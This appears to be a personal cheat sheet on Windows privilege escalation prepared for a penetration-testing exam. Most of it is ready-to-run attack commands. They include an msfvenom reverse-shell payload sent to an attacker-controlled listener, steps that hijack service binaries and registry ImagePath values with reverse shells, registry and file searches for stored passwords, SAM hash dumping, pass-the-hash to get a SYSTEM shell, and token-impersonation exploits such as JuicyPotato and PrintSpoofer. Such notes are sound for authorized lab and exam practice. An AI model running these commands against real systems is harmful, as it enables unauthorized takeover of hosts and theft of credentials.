# Privilege Escalation - Windows

---

## Table of Contents

- [Checklist](#checklist)
- [Enumeration Tools](#enumeration-tools)
- [Kernel Exploits](#kernel-exploits)
- [Service Exploits](#service-exploits)
- [Registry](#registry)
- [Passwords](#passwords)
- [Scheduled Tasks](#scheduled-tasks)
- [Insecure GUI Applications](#insecure-gui-applications)
- [Token Impersonation](#token-impersonation)
- [Software Vulnerabilities](#software-vulnerabilities)

---

## Checklist
- [ ] whoami /priv (SeImpersonatePrivileges or SeAssignPrimaryToken == WIN)
- [ ] systeminfo
- [ ] winPEAS
- [ ] Other

---

## Enumeration Tools

For enumerating, use WinPEAS first. Try to avoid PowerUp on exam! But if used, make sure to not use any of the auto-exploit scripts!

### PowerUp

First loads the script with: `. .\PowerUp.ps1`

Then run all checks with: `Invoke-AllChecks`

### SharpUp
`.\SharpUp.exe`

### Seatbelt

Source: https://github.com/GhostPack/Seatbelt
Pre-Compiled: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe

Run all checks with: `.\Seatbelt.exe all`
Or individual checks: `.\Seatbelt.exe <check> <check> <...>`

### WinPEAS

First run `reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`

All (fast) checks: `.\winPEASany.exe quiet cmd fast`
Specific categories: `.\winPEASany.exe quiet cmd systeminfo`

### AccessChk

Coming Soon...

---

## Kernel Exploits

### Tools

WES (Windows Exploit Suggester): https://github.com/bitsadmin/wesng
Pre-Compiled exploits: https://github.com/SecWiki/windows-kernel-exploits
Watson: https://github.com/rasta-mouse/Watson

### Privilege Escalation Example (Win7)

1. On the windows machine, run:

```cmd
systeminfo > \\my.kali.ip.here\SHARE\systeminfo.txt
```

2. Then on Kali, you can run wesng on the systeminfo.txt with

```bash
python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
```

3. Cross-ref results with compiled exploits at SecWiki

4. Run your reverse shell payload from msfvenom as an argument for the compiled exploit.

---

## Service Exploits

### Service Commands

Query the service: `sc.exe qc <name>`
Query the state of the service: `sc.exe query <name>`
Modify a configuration option of a service: `sc.exe config <name> <option>=<value>`
Start/Stop a service: `net start/stop <name>`

### Possible Misconfigurations

- Insecure Service Properties
- Unquoted Service Path
- Weak Registry Permissions
- Insecure Service Executables
- DLL Hijacking

###  Insecure Service Properties/Permissions

Dangerous permissions: `SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS`
Useful permissions: `SERVICE_STOP, SERVICE_START`

*NOTE: If you can change service configs, but can't stop/start the service, you may not be able to PrivEsc!*

#### PrivEsc Example
1. Check with winPEAS: `.\winPEASany.exe quiet servicesinfo`
2. Confirm result with AccessChk: `.\accesschk.exe /accepteula -uwcqv user <name>`
3. Check configuration: `sc qc <name>`
4. Check status: `sc query <name>`
5. Reconfigure path: `sc config <name> binpath="\"C:\PrivEsc\reverse.exe"\"`
6. Start Listener
7. Start/restart service: `net start <name>`

### Unquoted Service Path

Unquoted paths (ex): `C:\Program Files\Some Dir\SomeProgram.exe`
Possible paths:
 - `C:\Program.exe`
 - `C:\Program Files\Some.exe`

Check all potential write permissions:
 - `.\accesschk.exe /accepteula -uwdq C:\`
 - `.\accesschk.exe /accepteula -uwdq "C:\Program Files\"`
 - `.\accesschk.exe /accepteula -uwdq "C:\Program Files\Some Dir\"`

Copy rev shell to writeable directory.
Then `net start <name>`

### Weak Registry Permission

Requires: SERVICE_START

Can allow you to modify a service indirectly to PrivEsc

1. Check for service misconfiguration: `.\winPEASany.exe quiet servicesinfo`
2. Confirm misconfiguration with one of the following:
	1. `PS> Get-Acl HKLM:\System\CurrentControlSet\Services\<name> | Format-List`
	2. `.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<name>`
3. Overwrite registry key value to point to our own rev shell: 
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\services\<name> /v ImagePath /t REG_EXPAND_SZ /d C:\path /f
```
5. Start service: `net start <name>`

### Insecure Service Executables

Requires: SERVICE_START

Exchange a service executable if we have write permissions to it.

1. Check for the vulnerability: `.\winPEASany.exe quiet servicesinfo`
2. Verify with accesschk: `.\accesschk.exe /accepteula -quvw "C:\Program Files\Service Path\service.exe"`
3. Backup the service exe: `copy "C:\Program Files\Service Path\service.exe" C:\Temp`
4. Overwrite with our revshell: `copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Service Path\service.exe"`
5. Start listener on Kali
6. Start service: `net start <name>`

### DLL Hijacking

Requires: SERVICE_START/STOP

(might require admin privs, check the PDF for details on how to perform)

---

## Registry

### AutoRun

NOTE: This will only run with the privileges of the last logged in user in Win 10! So you need admin creds first (making it less reliable)

1. Check for writable AutoRun exes
	1. `.\winPEASany.exe quiet applicationsinfo`
	2. Or manually:
		1. `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
		2. Verify each entry with accesschk:
			`.\accesschk.exe /accepteula -wvu "C:\Program Files\<path to program>\program.exe"`
2. If writeable, create a backup: `copy "C:\Program Files\<path to program>\program.exe" C:\temp`
3. Copy revshell exe: `copy /Y C:\temp\revshell.exe "C:\Program Files\<path to program>\program.exe"`
4. Start revshell listener and restart the box

### AlwaysInstallElevated

Requires: AlwaysInstallElevated reg entries

1. Verify that the required entries are both set to 1
	1. Using winPEAS: `.\winPEASany.exe quiet windowscreds`
	2. Manually:
		1. `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
		2. `reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
2. Create a msfvenom revshell: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=443 -f msi -o revshell.msi`
3. Copy the msi file to the target and start a listener
4. Start the installer: `msiexec /quiet /qn /i C:\temp\revshell.msi`

---

## Passwords

### Registry Search

The slow way (scans the entire registry):
```
> reg query HKLM /f password /t REG_SZ /s
> reg query HKCU /f password /t REG_SZ /s
```

The faster way:
1. Use winpeas to check common locations: `.\winPEASany.exe quiet filesinfo userinfo`
2. Verify using registry queries
3. If verified, we can use winexe to spawn a shell: `winexe -U 'user%password' //the.targets.ip.here cmd.exe`

### Saved Credentials

1. Use winPEAS to check for saved creds: `.\winPEASany.exe quiet cmd windowscreds`
2. Verify with: `cmdkey /list`
3. We can then use saved creds to run any command as the user: `runas /savecred /user:admin C:\temp\revshell.exe`

### Configuration Files

NOTE: Unattend.xml is a possible useful file!

Search for configuration files (containing the word pass or ending in .config): `dir /s *pass* == *.config`

Search for files containing the word password: `findstr /si password *.xml *.ini *.txt`

You can also find files like this with winPEAS: `.\winPEASany.exe quiet cmd searchfast filesinfo`

Any credentials found like this could then be abused with winexe: `winexe -U 'user%password' //the.targets.ip.here cmd.exe`

### SAM

SAM and SYSTEM file dumps. Check for baskcups in `C:\Windows\Repair` or `C:\Windows\System32\config\RegBack`

Dump password hashes with creddump, pwdump or samdump. Crack with john or hashcat.

### Pass-the-Hash

Instead of cracking the dumped hashes, you can pass the hash with pth-winexe:

`pth-winexe -U 'admin%HASH_HERE' //the.targets.ip.here cmd.exe`

You can also add `--system` with the admin hash to spawn a SYSTEM shell instead.

---

## Scheduled Tasks

To list all scheduled tasks you can see: `schtasks /query /fo LIST /v`
Powershell: `Get-ScheduledTask| where {$_.TaskPath-notlike"\Microsoft*"} | ft TaskName,TaskPath,State`

1. If you find a task with decent permissions, verify with accesschk: `.\accesschk.exe /accepteula -quvw user C:\Program Files\<path to program\program.exe`
2. If you can write to it, you can either replace it with a revshell, or if it's a script, append the path to our revshell to it.

---

## Insecure GUI Applications

Requires: A program with "run as admin" enabled. 

In the program: File -> Open -> `file://c:/windows/system32/cmd.exe`

This should open a cmd.exe running as administrator.

---

## Token Impersonation

All of these require: `SeImpersonatePrivilege` or `SeAssignPrimaryToken`

If you need a local service account (possible), you can generate one as an admin using PSExec64.exe using: `.\PSExec64.exe -i -u "nt authority\local service" C:\temp\revshell.exe`

### JuicyPotato

Run:  `.\JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t * -c {CLSID}`

Find a CLSID here: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

### RoguePotato

### PrintSpoofer

Run: `.\PrintSpoofer.exe -i -c "C:\temp\revshell.exe"`


